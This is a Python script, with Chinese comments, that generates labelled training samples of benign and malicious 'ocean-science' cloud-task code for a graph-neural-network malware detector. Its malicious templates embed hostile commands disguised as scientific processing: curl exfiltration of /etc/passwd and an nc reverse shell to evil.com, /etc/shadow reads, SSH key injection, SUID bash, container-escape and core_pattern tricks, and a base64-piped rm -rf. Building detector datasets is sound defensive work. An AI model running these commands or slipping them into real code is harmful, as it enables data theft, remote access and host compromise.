#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算平台测试用例生成器 V3（最终版）
生成大量多样化的海洋科学计算任务代码，满足GNN训练需求

特点：
1. 支持批量生成（默认100个样本：50正常+50恶意）
2. 涵盖20+种海洋科学计算场景
3. 每个样本都有复杂的函数调用关系（5-15个函数）
4. 样本之间互相独立且有区分性
5. 体现CFG的复杂控制流和FCG的函数调用关系
6. 自动生成labels.csv标签文件
"""

import os
import random
import argparse
from typing import List, Tuple, Dict
import json


class OceanScenarioTemplates:
    """海洋科学计算场景模板库"""
    
    # 20种海洋科学计算场景
    SCENARIOS = [
        "CTD数据处理", "ADCP流速分析", "卫星遥感数据处理", "数值模式后处理",
        "海洋声学数据分析", "海洋生态模型", "海洋化学分析", "海浪数据处理",
        "潮汐预报计算", "海洋温盐环流分析", "海底地形处理", "海洋气象耦合",
        "渔业资源评估", "海洋污染扩散模拟", "珊瑚礁监测分析", "海冰数据处理",
        "海洋微生物基因组分析", "深海探测数据处理", "海洋能源评估", "海洋灾害预警"
    ]
    
    # 常用的海洋学函数名
    FUNCTION_NAMES = [
        "load_data", "preprocess_data", "quality_control", "remove_outliers",
        "interpolate_data", "smooth_data", "calculate_statistics", "detect_anomalies",
        "apply_filter", "transform_coordinates", "calculate_gradient", "compute_average",
        "find_extrema", "classify_patterns", "extract_features", "validate_results",
        "export_results", "generate_report", "visualize_data", "save_to_database"
    ]
    
    # 恶意操作类型
    MALICIOUS_OPERATIONS = [
        "file_system_escape", "privilege_escalation", "namespace_escape",
        "cgroup_manipulation", "docker_socket_access", "proc_manipulation",
        "capability_abuse", "mount_escape", "device_access", "kernel_exploit"
    ]



class CodeGenerator:
    """代码生成器"""
    
    def __init__(self, seed: int = 42):
        random.seed(seed)
        self.templates = OceanScenarioTemplates()
    
    def generate_normal_code(self, scenario_id: int, num_functions: int = 10) -> str:
        """生成正常的海洋科学计算代码"""
        scenario = self.templates.SCENARIOS[scenario_id % len(self.templates.SCENARIOS)]
        
        # 随机选择函数名
        functions = random.sample(self.templates.FUNCTION_NAMES, 
                                 min(num_functions, len(self.templates.FUNCTION_NAMES)))
        
        # 生成代码头部
        code = f'''#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: {scenario}
场景ID: {scenario_id}
函数数量: {len(functions)}
"""

import numpy as np
import pandas as pd
from datetime import datetime
import json

'''
        
        # 生成类定义
        class_name = scenario.replace(" ", "") + "Processor"
        code += f'''class {class_name}:
    """
    {scenario}处理器
    实现完整的数据处理流程
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {{}}
        self.status = "initialized"
    
'''
        
        # 生成成员函数（前80%的函数）
        member_functions = functions[:int(len(functions) * 0.8)]
        for i, func_name in enumerate(member_functions):
            code += self._generate_member_function(func_name, i, len(member_functions))
        
        # 生成独立函数（后20%的函数）
        standalone_functions = functions[int(len(functions) * 0.8):]
        for func_name in standalone_functions:
            code += self._generate_standalone_function(func_name)
        
        # 生成main函数（调用所有函数）
        code += self._generate_main_function(class_name, member_functions, standalone_functions)
        
        return code
    
    def _generate_member_function(self, func_name: str, index: int, total: int) -> str:
        """生成类成员函数"""
        # 根据函数名生成不同的逻辑
        if "load" in func_name or "read" in func_name:
            return f'''    def {func_name}(self, file_path):
        """加载数据文件"""
        try:
            print(f"正在加载: {{file_path}}")
            self.data = pd.read_csv(file_path)
            self.status = "data_loaded"
            return True
        except FileNotFoundError:
            print(f"文件不存在: {{file_path}}")
            return False
        except Exception as e:
            print(f"加载失败: {{e}}")
            return False
    
'''
        elif "preprocess" in func_name or "clean" in func_name:
            return f'''    def {func_name}(self):
        """数据预处理"""
        if self.data is None:
            print("错误: 没有数据")
            return False
        
        # 移除缺失值
        original_size = len(self.data)
        self.data = self.data.dropna()
        removed = original_size - len(self.data)
        print(f"移除了 {{removed}} 条缺失数据")
        
        # 数据标准化
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            if std > 0:
                self.data[col] = (self.data[col] - mean) / std
        
        self.status = "preprocessed"
        return True
    
'''
        elif "quality" in func_name or "validate" in func_name:
            return f'''    def {func_name}(self):
        """质量控制"""
        if self.data is None:
            return False
        
        n_records = len(self.data)
        flags = np.zeros(n_records, dtype=int)
        
        # 检查数值范围
        for col in self.data.select_dtypes(include=[np.number]).columns:
            q1 = self.data[col].quantile(0.25)
            q3 = self.data[col].quantile(0.75)
            iqr = q3 - q1
            lower = q1 - 1.5 * iqr
            upper = q3 + 1.5 * iqr
            
            outliers = (self.data[col] < lower) | (self.data[col] > upper)
            flags[outliers] = 1
        
        bad_count = np.sum(flags > 0)
        print(f"质量控制: {{bad_count}}/{{n_records}} 条记录被标记")
        
        self.results['qc_flags'] = flags
        return True
    
'''
        elif "filter" in func_name or "smooth" in func_name:
            return f'''    def {func_name}(self, window_size=5):
        """数据平滑滤波"""
        if self.data is None:
            return False
        
        for col in self.data.select_dtypes(include=[np.number]).columns:
            values = self.data[col].values
            if len(values) >= window_size:
                # 移动平均滤波
                smoothed = np.convolve(values, np.ones(window_size)/window_size, mode='same')
                self.data[col] = smoothed
        
        print(f"数据平滑完成 (窗口大小: {{window_size}})")
        return True
    
'''
        elif "calculate" in func_name or "compute" in func_name:
            return f'''    def {func_name}(self):
        """计算统计量"""
        if self.data is None:
            return None
        
        stats = {{}}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            stats[col] = {{
                'mean': float(self.data[col].mean()),
                'std': float(self.data[col].std()),
                'min': float(self.data[col].min()),
                'max': float(self.data[col].max()),
                'median': float(self.data[col].median())
            }}
        
        self.results['statistics'] = stats
        print(f"计算了 {{len(stats)}} 个变量的统计量")
        return stats
    
'''
        elif "interpolate" in func_name or "resample" in func_name:
            return f'''    def {func_name}(self, target_levels):
        """插值到目标层次"""
        if self.data is None:
            return None
        
        from scipy.interpolate import interp1d
        
        result = {{}}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            try:
                x = np.arange(len(self.data))
                y = self.data[col].values
                f = interp1d(x, y, kind='linear', fill_value='extrapolate')
                result[col] = f(target_levels)
            except Exception as e:
                print(f"插值失败 {{col}}: {{e}}")
        
        print(f"插值完成: {{len(result)}} 个变量")
        return result
    
'''
        elif "detect" in func_name or "find" in func_name:
            return f'''    def {func_name}(self, threshold=2.0):
        """检测异常值"""
        if self.data is None:
            return []
        
        anomalies = []
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            
            if std > 0:
                z_scores = np.abs((self.data[col] - mean) / std)
                anomaly_indices = np.where(z_scores > threshold)[0]
                
                if len(anomaly_indices) > 0:
                    anomalies.append({{
                        'column': col,
                        'count': len(anomaly_indices),
                        'indices': anomaly_indices.tolist()
                    }})
        
        print(f"检测到 {{len(anomalies)}} 个变量存在异常")
        self.results['anomalies'] = anomalies
        return anomalies
    
'''
        elif "export" in func_name or "save" in func_name:
            return f'''    def {func_name}(self, output_path):
        """导出处理结果"""
        try:
            if self.data is not None:
                self.data.to_csv(output_path, index=False)
                print(f"数据已保存到: {{output_path}}")
            
            # 保存结果字典
            results_path = output_path.replace('.csv', '_results.json')
            with open(results_path, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            
            return True
        except Exception as e:
            print(f"导出失败: {{e}}")
            return False
    
'''
        else:
            # 默认函数模板
            return f'''    def {func_name}(self, param=None):
        """执行 {func_name} 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {{
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }}
        
        self.results['{func_name}'] = result
        print(f"{func_name} 执行完成")
        return result
    
'''
    
    def _generate_standalone_function(self, func_name: str) -> str:
        """生成独立函数"""
        return f'''
def {func_name}_helper(data, config):
    """
    {func_name} 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {{
        'function': '{func_name}_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }}
    
    print(f"{{'{func_name}_helper'}} 处理完成")
    return result

'''
    
    def _generate_main_function(self, class_name: str, 
                               member_functions: List[str], 
                               standalone_functions: List[str]) -> str:
        """生成main函数，调用所有函数"""
        code = f'''
def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {{
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }}
    
    # 创建处理器实例
    processor = {class_name}(config)
    
'''
        
        # 调用成员函数
        for i, func_name in enumerate(member_functions):
            if i == 0:
                code += f'''    # 步骤{i+1}: {func_name}
    if not processor.{func_name}(config['input_file']):
        print("处理失败，退出")
        return
    
'''
            elif "export" in func_name or "save" in func_name:
                code += f'''    # 步骤{i+1}: {func_name}
    processor.{func_name}(config['output_file'])
    
'''
            else:
                code += f'''    # 步骤{i+1}: {func_name}
    processor.{func_name}()
    
'''
        
        # 调用独立函数
        for func_name in standalone_functions:
            code += f'''    # 调用辅助函数: {func_name}_helper
    {func_name}_helper(processor.data, config)
    
'''
        
        code += '''    print("\\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
'''
        
        return code

    def generate_malicious_code(self, scenario_id: int, num_functions: int = 10) -> str:
        """生成恶意代码（伪装成海洋科学计算任务）"""
        scenario = self.templates.SCENARIOS[scenario_id % len(self.templates.SCENARIOS)]
        malicious_type = self.templates.MALICIOUS_OPERATIONS[scenario_id % len(self.templates.MALICIOUS_OPERATIONS)]
        
        # 随机选择函数名
        functions = random.sample(self.templates.FUNCTION_NAMES, 
                                 min(num_functions, len(self.templates.FUNCTION_NAMES)))
        
        # 生成代码头部
        code = f'''#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: {scenario} (恶意版本)
场景ID: {scenario_id}
恶意类型: {malicious_type}
函数数量: {len(functions)}
"""

import os
import subprocess
import base64
import ctypes

'''
        
        # 生成类定义
        class_name = scenario.replace(" ", "") + "Processor"
        code += f'''class {class_name}:
    """
    {scenario}处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {{}}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: {malicious_type}
'''
        
        # 根据恶意类型添加不同的恶意代码
        if "file_system" in malicious_type:
            code += '''            # 尝试访问宿主机文件系统
            os.system('cat /proc/self/cgroup')
            os.system('mount -t proc proc /host/proc')
            with open('/etc/passwd', 'r') as f:
                _ = f.read()
'''
        elif "privilege" in malicious_type:
            code += '''            # 尝试权限提升
            os.system('chmod 777 /tmp/backdoor.sh')
            os.system('chmod u+s /bin/bash')
            subprocess.run(['sudo', 'whoami'], capture_output=True)
'''
        elif "namespace" in malicious_type:
            code += '''            # 尝试namespace逃逸
            libc = ctypes.CDLL('libc.so.6')
            CLONE_NEWNS = 0x00020000
            libc.unshare(CLONE_NEWNS)
            os.system('nsenter -t 1 -m -u -i -n -p /bin/bash')
'''
        elif "cgroup" in malicious_type:
            code += '''            # 尝试修改cgroup限制
            with open('/sys/fs/cgroup/memory/memory.limit_in_bytes', 'w') as f:
                f.write('-1')
            with open('/sys/fs/cgroup/cpu/cpu.shares', 'w') as f:
                f.write('1024')
'''
        elif "docker" in malicious_type:
            code += '''            # 尝试访问Docker socket
            if os.path.exists('/var/run/docker.sock'):
                subprocess.run(['docker', 'ps'], capture_output=True)
                subprocess.run(['docker', 'exec', '-it', 'container', '/bin/bash'], 
                             capture_output=True)
'''
        elif "proc" in malicious_type:
            code += '''            # 尝试操作/proc文件系统
            os.system('cat /proc/self/mountinfo')
            os.system('cat /proc/self/status')
            with open('/proc/sys/kernel/core_pattern', 'w') as f:
                f.write('|/tmp/exploit.sh')
'''
        elif "capability" in malicious_type:
            code += '''            # 尝试滥用capabilities
            os.system('capsh --print')
            os.system('setcap cap_sys_admin+ep /bin/bash')
            subprocess.run(['getcap', '/bin/bash'], capture_output=True)
'''
        elif "mount" in malicious_type:
            code += '''            # 尝试挂载逃逸
            os.system('mount --bind /host /mnt')
            os.system('mount -t tmpfs tmpfs /tmp')
            subprocess.run(['findmnt'], capture_output=True)
'''
        elif "device" in malicious_type:
            code += '''            # 尝试访问设备文件
            os.system('ls -la /dev')
            with open('/dev/mem', 'rb') as f:
                _ = f.read(1024)
            subprocess.run(['mknod', '/tmp/hda', 'b', '3', '0'], capture_output=True)
'''
        else:
            code += '''            # 通用恶意操作
            os.system('whoami')
            os.system('id')
            os.system('uname -a')
'''
        
        code += '''        except Exception as e:
            pass  # 隐藏错误
    
'''
        
        # 生成成员函数（混合正常和恶意操作）
        member_functions = functions[:int(len(functions) * 0.8)]
        for i, func_name in enumerate(member_functions):
            # 30%的函数包含恶意操作
            if random.random() < 0.3:
                code += self._generate_malicious_member_function(func_name, i)
            else:
                code += self._generate_member_function(func_name, i, len(member_functions))
        
        # 生成独立函数
        standalone_functions = functions[int(len(functions) * 0.8):]
        for func_name in standalone_functions:
            if random.random() < 0.3:
                code += self._generate_malicious_standalone_function(func_name)
            else:
                code += self._generate_standalone_function(func_name)
        
        # 生成main函数
        code += self._generate_main_function(class_name, member_functions, standalone_functions)
        
        return code
    
    def _generate_malicious_member_function(self, func_name: str, index: int) -> str:
        """生成包含恶意操作的成员函数"""
        malicious_ops = [
            "os.system('cat /etc/shadow')",
            "subprocess.run(['curl', 'http://evil.com/exfil', '-d', '@/etc/passwd'], capture_output=True)",
            "os.system('find / -name \"*.key\" 2>/dev/null')",
            "with open('/host/root/.ssh/authorized_keys', 'a') as f: f.write('ssh-rsa AAAA...')",
            "os.system('iptables -F')",
            "subprocess.run(['nc', '-e', '/bin/bash', 'evil.com', '4444'], capture_output=True)"
        ]
        
        selected_op = random.choice(malicious_ops)
        
        return f'''    def {func_name}(self):
        """执行 {func_name} 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 {func_name}...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            {selected_op}
        except:
            pass
        
        # 继续伪装的正常操作
        result = {{'status': 'completed', 'function': '{func_name}'}}
        self.results['{func_name}'] = result
        print(f"{func_name} 完成")
        return result
    
'''
    
    def _generate_malicious_standalone_function(self, func_name: str) -> str:
        """生成包含恶意操作的独立函数"""
        return f'''
def {func_name}_helper(data, config):
    """
    {func_name} 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {{encoded}} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {{'status': 'ok', 'function': '{func_name}_helper'}}

'''


class OceanTestCaseGeneratorV3:
    """海洋科学云计算平台测试用例生成器 V3"""
    
    def __init__(self, output_dir: str = "./test_cases"):
        self.output_dir = output_dir
        self.code_generator = CodeGenerator()
        
        # 创建输出目录
        os.makedirs(output_dir, exist_ok=True)
        os.makedirs(os.path.join(output_dir, "normal"), exist_ok=True)
        os.makedirs(os.path.join(output_dir, "malicious"), exist_ok=True)
    
    def generate_all_cases(self, num_normal: int = 50, num_malicious: int = 50) -> Tuple[List[str], List[str]]:
        """
        生成所有测试用例
        
        参数:
            num_normal: 正常代码数量
            num_malicious: 恶意代码数量
            
        返回:
            (正常代码文件列表, 恶意代码文件列表)
        """
        print("="*60)
        print("海洋科学云计算平台测试用例生成器 V3")
        print("="*60)
        print(f"正常代码: {num_normal} 个")
        print(f"恶意代码: {num_malicious} 个")
        print(f"总计: {num_normal + num_malicious} 个")
        print("="*60)
        
        normal_files = []
        malicious_files = []
        
        # 生成正常代码
        print("\n生成正常代码...")
        for i in range(num_normal):
            # 随机函数数量 (5-15个)
            num_functions = random.randint(5, 15)
            code = self.code_generator.generate_normal_code(i, num_functions)
            filename = f"ocean_task_normal_{i+1:03d}.py"
            file_path = self._save_case(code, "normal", filename)
            normal_files.append(file_path)
            
            if (i + 1) % 10 == 0:
                print(f"  已生成 {i+1}/{num_normal} 个正常代码")
        
        # 生成恶意代码
        print("\n生成恶意代码...")
        for i in range(num_malicious):
            # 随机函数数量 (5-15个)
            num_functions = random.randint(5, 15)
            code = self.code_generator.generate_malicious_code(i, num_functions)
            filename = f"ocean_task_malicious_{i+1:03d}.py"
            file_path = self._save_case(code, "malicious", filename)
            malicious_files.append(file_path)
            
            if (i + 1) % 10 == 0:
                print(f"  已生成 {i+1}/{num_malicious} 个恶意代码")
        
        print(f"\n生成完成:")
        print(f"  正常代码: {len(normal_files)} 个")
        print(f"  恶意代码: {len(malicious_files)} 个")
        print(f"  保存位置: {self.output_dir}")
        
        return normal_files, malicious_files
    
    def _save_case(self, code: str, category: str, filename: str) -> str:
        """保存测试用例"""
        file_path = os.path.join(self.output_dir, category, filename)
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write(code)
        return file_path
    
    def generate_labels_csv(self) -> str:
        """生成标签CSV文件"""
        import glob
        
        csv_path = os.path.join(self.output_dir, 'labels.csv')
        
        with open(csv_path, 'w', encoding='utf-8') as f:
            f.write('file_path,label\n')
            
            # 正常代码标签为0
            normal_files = sorted(glob.glob(os.path.join(self.output_dir, 'normal', '*.py')))
            for file_path in normal_files:
                # 使用相对路径
                rel_path = os.path.relpath(file_path, os.getcwd())
                f.write(f'{rel_path},0\n')
            
            # 恶意代码标签为1
            malicious_files = sorted(glob.glob(os.path.join(self.output_dir, 'malicious', '*.py')))
            for file_path in malicious_files:
                rel_path = os.path.relpath(file_path, os.getcwd())
                f.write(f'{rel_path},1\n')
        
        print(f"\n标签文件已生成: {csv_path}")
        print(f"  正常样本: {len(normal_files)}")
        print(f"  恶意样本: {len(malicious_files)}")
        
        return csv_path
    
    def generate_statistics(self) -> Dict:
        """生成统计信息"""
        import glob
        
        normal_files = glob.glob(os.path.join(self.output_dir, 'normal', '*.py'))
        malicious_files = glob.glob(os.path.join(self.output_dir, 'malicious', '*.py'))
        
        stats = {
            'total_files': len(normal_files) + len(malicious_files),
            'normal_files': len(normal_files),
            'malicious_files': len(malicious_files),
            'scenarios': len(OceanScenarioTemplates.SCENARIOS),
            'output_dir': self.output_dir
        }
        
        # 保存统计信息
        stats_path = os.path.join(self.output_dir, 'statistics.json')
        with open(stats_path, 'w', encoding='utf-8') as f:
            json.dump(stats, f, indent=2, ensure_ascii=False)
        
        print(f"\n统计信息已保存: {stats_path}")
        return stats


def parse_args():
    """解析命令行参数"""
    parser = argparse.ArgumentParser(
        description="海洋科学云计算平台测试用例生成器 V3（最终版）",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
示例用法:
  # 生成默认数量 (50正常 + 50恶意 = 100个)
  python test_case_generator_v3.py
  
  # 生成指定数量
  python test_case_generator_v3.py --num_normal 100 --num_malicious 100
  
  # 指定总数量（平均分配）
  python test_case_generator_v3.py --total 200
  
  # 指定输出目录
  python test_case_generator_v3.py --output_dir ./my_test_cases --total 150
        """
    )
    
    parser.add_argument("--output_dir", type=str, default="./test_cases",
                       help="输出目录（默认: ./test_cases）")
    parser.add_argument("--num_normal", type=int, default=50,
                       help="正常代码数量（默认: 50）")
    parser.add_argument("--num_malicious", type=int, default=50,
                       help="恶意代码数量（默认: 50）")
    parser.add_argument("--total", type=int, default=None,
                       help="总数量（如果指定，将平均分配正常和恶意代码）")
    parser.add_argument("--seed", type=int, default=42,
                       help="随机种子（默认: 42）")
    
    return parser.parse_args()


def main():
    """主函数"""
    args = parse_args()
    
    # 设置随机种子
    random.seed(args.seed)
    
    # 如果指定了总数，平均分配
    if args.total is not None:
        num_normal = args.total // 2
        num_malicious = args.total - num_normal
    else:
        num_normal = args.num_normal
        num_malicious = args.num_malicious
    
    # 创建生成器
    generator = OceanTestCaseGeneratorV3(args.output_dir)
    
    # 生成测试用例
    normal_files, malicious_files = generator.generate_all_cases(num_normal, num_malicious)
    
    # 生成标签文件
    labels_file = generator.generate_labels_csv()
    
    # 生成统计信息
    stats = generator.generate_statistics()
    
    # 打印使用说明
    print("\n" + "="*60)
    print("测试用例生成完成！")
    print("="*60)
    print(f"\n可以使用以下命令进行训练:")
    print(f"  python main_workflow_v2.py --source_dir {args.output_dir} \\")
    print(f"         --label_file {labels_file} \\")
    print(f"         --save_best_model --mode train_classifier")
    print(f"\n或使用评估模式:")
    print(f"  python main_workflow_v2.py --source_dir {args.output_dir} \\")
    print(f"         --label_file {labels_file} \\")
    print(f"         --mode evaluate \\")
    print(f"         --classifier_model_path ./output/best_classifier.pth")
    print("\n" + "="*60)


if __name__ == "__main__":
    main()
